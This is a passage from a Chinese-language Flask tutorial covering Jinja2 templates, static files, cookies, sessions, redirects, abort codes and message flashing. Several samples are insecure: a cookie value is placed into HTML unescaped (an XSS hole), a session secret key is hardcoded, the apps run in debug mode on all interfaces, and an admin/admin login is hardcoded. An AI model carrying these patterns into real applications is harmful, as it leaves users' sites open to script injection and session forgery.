punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>marks <span class="token operator">=</span> score<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#自动寻找目录下的templates文件夹下的html文件</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><ul><li><strong>{ % … %}</strong>：用于语句</li><li><strong>{ {  … } }</strong>：用于表达式可以打印到模板输出</li><li><strong>{ # … # }</strong>：用于未包含在模板输出中的注释</li><li><strong># … ##</strong>：用于行语句</li></ul><p>另外测试语句效果，修改hello.html为以下内容</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>{% if marks>50 %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Your result is pass!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>{% else %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Your result is fail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>{% endif %}</code></pre><p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p><p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p><h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      &lt;script type = "text/javascript"          src = "{ {  url_for('static', filename = 'hello.js') }}" ><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      &lt;input type = "button" onclick = "sayHello()" value = "Say Hello" />   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>hello.js</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hello.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/setcookie'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>       resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'readcookie.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span>       <span class="token keyword">return</span> resp@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/getcookie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   name <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">)</span>   a <span class="token operator">=</span> <span class="token string">"&lt;h1>welcome '{ }'&lt;/h1>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span>   <span class="token keyword">return</span> a<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>index.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/setcookie<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Enter userID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>nm<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>Login<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>readcookie.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/getcookie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click here to read cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'any random string'</span><span class="token comment" spellcheck="true">#app.secret_key = os.urandom(12)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as '</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span> <span class="token string">"&lt;b>&lt;a href = '/logout'>click here to log out&lt;/a>&lt;/b>"</span>    <span class="token keyword">return</span> <span class="token string">"You are not logged in &lt;br>&lt;a href = '/login'>&lt;/b>"</span> <span class="token operator">+</span> <span class="token string">"click here to log in&lt;/b>&lt;/a>"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''   &lt;form action = "" method = "post">      &lt;p>&lt;input type = text name = username />&lt;/p>      &lt;p>&lt;input type = submit value = Login />&lt;/p>   &lt;/form>   '''</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>None<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>这里将session_key设置成了any random string</p><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token operator">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>当用户输入不为admin时则直接302重定向到login界面</p><p>login.html</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>html<span class="token operator">></span>   <span class="token operator">&lt;</span>body<span class="token operator">></span>      <span class="token operator">&lt;</span>form action <span class="token operator">=</span> <span class="token string">"http://192.168.0.102:5000/login"</span> method <span class="token operator">=</span> <span class="token string">"post"</span><span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span>Enter Name<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>input type <span class="token operator">=</span> <span class="token string">"text"</span> name <span class="token operator">=</span> <span class="token string">"username"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>input type <span class="token operator">=</span> <span class="token string">"submit"</span> value <span class="token operator">=</span> <span class="token string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>   <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>报错：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            abort<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未不到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><p>若登录不是admin则报401：<code>Unauthorized</code>错误</p><h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>flash<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> None    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">'Invalid username or password. Please try again!'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'You were successfully logged in'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> error <span class="token operator">=</span> error<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p><ul><li><strong>message</strong>：参数是要闪现的实际消息。</li><li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p><p>典型的消息闪现模板：</p><pre class=" language-html"><code class="language-html">{% with messages = get_flashed_messages() %}   {% if messages %}      {% for message in messages %}         {{  message }}      {% endfor %}   {% endif %}{% endwith %}</code></pre><p>下面给出html代码：</p><p>index.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>{% with messages = get_flashed_messages() %}    {% if messages %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          {% for message in messages %}          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{ {  message }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          {% endfor %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    {% endif %} {% endwith %} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Flask Message Flashing Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Do you want to &lt;a href = "{{  url_for('login') }}"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>log in?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>login.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token doctype">&lt;!doctype html></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>   {% if error %}   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Error:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span> {{  error }}   {% endif %}   &lt;form action = "" method = post>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>         &lt;input type = text name = username value = "{{ request.form.username }}">      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>&lt;input type = password name = password><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;input type = submit value = Login><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token 